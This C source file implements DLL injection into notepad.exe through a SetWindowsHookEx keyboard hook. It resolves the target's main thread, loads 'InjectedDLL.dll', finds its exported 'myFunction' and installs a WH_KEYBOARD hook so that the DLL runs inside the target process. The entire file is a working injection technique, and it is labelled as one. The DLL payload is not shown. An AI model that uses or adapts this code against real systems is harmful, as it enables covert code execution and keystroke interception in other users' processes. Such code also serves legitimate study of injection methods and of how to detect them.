#include "SetWindowsHooksEx.h"

BOOL SetWindowsHooksEx_Injection()
{
	TCHAR lpDllName[] = _T("InjectedDLL.dll");
	TCHAR lpDllPath[MAX_PATH];
	HOOKPROC myFunctionAddress;
	HMODULE hOurDll;
	DWORD dwProcessId;
	DWORD dwThreadId;
	HHOOK hHook;

	/* Get Process ID from Process name */
	dwProcessId = GetProcessIdFromName(_T("notepad.exe"));
	_tprintf(_T("\t[+] Getting proc id: %d\n"), dwProcessId);

	/* Get thread id from process id */
	dwThreadId = GetMainThreadId(dwProcessId);
	_tprintf(_T("\t[+] Getting main thread id of proc id: %d\n"), dwThreadId);

	/* Get the full path of the dll to be injected */
	GetFullPathName(lpDllName, MAX_PATH, lpDllPath, NULL);
	_tprintf(_T("\t[+] Full DLL Path: %s\n"), lpDllPath);

	/* Obtain a handle to our injected dll */
	hOurDll = LoadLibrary(lpDllPath);
	if (hOurDll == NULL) {
		print_last_error(_T("LoadLibrary"));
		return FALSE;
	}
	
	/* Get 'myFunction' address */
	_tprintf(_T("\t[+] Looking for myFunction in our dll\n"));
	 myFunctionAddress = (HOOKPROC)GetProcAddress(hOurDll, "myFunction");
	if (myFunctionAddress == NULL) {
		print_last_error(_T("GetProcAddress"));
		return FALSE;
	}
	_tprintf(_T("\t[+] Found at 0x%08x\n"), myFunctionAddress);

	/* Injection happens here */
	hHook = SetWindowsHookEx(WH_KEYBOARD, myFunctionAddress, hOurDll, dwThreadId);
	if (hHook == NULL) {
		print_last_error(_T("SetWindowsHookEx"));
		return FALSE;
	}

	/* Unhook */
	UnhookWindowsHookEx(hHook); //When we want to remove the hook


}